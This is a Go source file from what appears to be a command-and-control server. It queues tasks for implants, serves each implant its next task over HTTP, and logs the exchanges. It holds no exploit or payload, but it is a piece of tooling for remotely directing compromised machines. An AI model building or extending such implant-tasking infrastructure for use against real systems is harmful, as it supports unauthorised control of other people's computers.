package main

/*
 * task.go
 * Send implants tasking
 * By J. Stuart McMurray
 * Created 20230223
 * Last Modified 20230225
 */

import (
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
)

// TaskMessagePrefix is the first part of a MessageTypeTaskQ message.
const TaskMessagePrefix = "Queued task for"

// TaskLog is used to marshal task-sending logging to unambiguous JSON.
type TaskLog struct {
	ID   string
	Task string `json:",omitempty"`
	Err  string `json:",omitempty"`
}

// HandleTask handles HTTP requests for tasking.
func HandleTask(w http.ResponseWriter, r *http.Request) {
	/* Work out the task for this implant. */
	id := ImplantID(r)
	task, err := getTask(id)

	/* Roll a log message. */
	l := TaskLog{
		ID:   id,
		Task: task,
	}
	mt := MessageTypeCallback

	/* Send back tasking, if we have it. */
	if 0 != len(task) {
		if _, terr := io.WriteString(w, task); nil != terr {
			err = errors.Join(err, terr)
		}
	}

	/* MultiErrors? */
	if nil != err {
		mt = MessageTypeError
		l.Err = err.Error()
	}

	RLogInteresting(l.ID, r, mt, l)
}

// getTask gets the next task for the named implant.
func getTask(id string) (string, error) {
	/* Get the current task queue. */
	tq, err := ReadQ()
	if nil != err {
		return "", fmt.Errorf("reading taskqueue: %w", err)
	}

	/* Get the task queue for this ID if we have one. */
	idq, ok := tq[id]
	if !ok || 0 == len(idq) { /* No tasking */
		WriteQ(nil)
		return "", nil
	}

	/* Pop off the next task and update the file. */
	t := idq[0]
	idq = idq[1:]
	tq[id] = idq
	if err := WriteQ(tq); nil != err {
		return t, fmt.Errorf("updating taskfile: %w", err)
	}

	return t, nil
}

// AddTask adds the task to id's queue and returns the queue length.  If
// onlyFile is true, the log will only go to the logfile (via flog).
func AddTask(id, task string, onlyFile bool) error {
	/* Get the current task queues. */
	tq, err := ReadQ()
	if nil != err {
		return fmt.Errorf("reading taskqueue: %w", err)
	}

	/* Add our task. */
	idtq := tq[id]
	if nil == idtq {
		idtq = make([]string, 0, 1)
	}
	idtq = append(idtq, task)
	n := len(idtq)
	tq[id] = idtq

	/* Write the queue back. */
	if err := WriteQ(tq); nil != err {
		return fmt.Errorf("writing taskqueue: %w", err)
	}

	/* Log the task being queued. */
	msg := fmt.Sprintf(
		"[%s] %s %q (qlen %d): %q",
		MessageTypeTaskQ,
		TaskMessagePrefix,
		id,
		n,
		task,
	)

	/* Log it to the right place. */
	if onlyFile {
		flog.Load().Printf("%s", msg)
	} else {
		log.Printf("%s", msg)
	}

	return nil
}
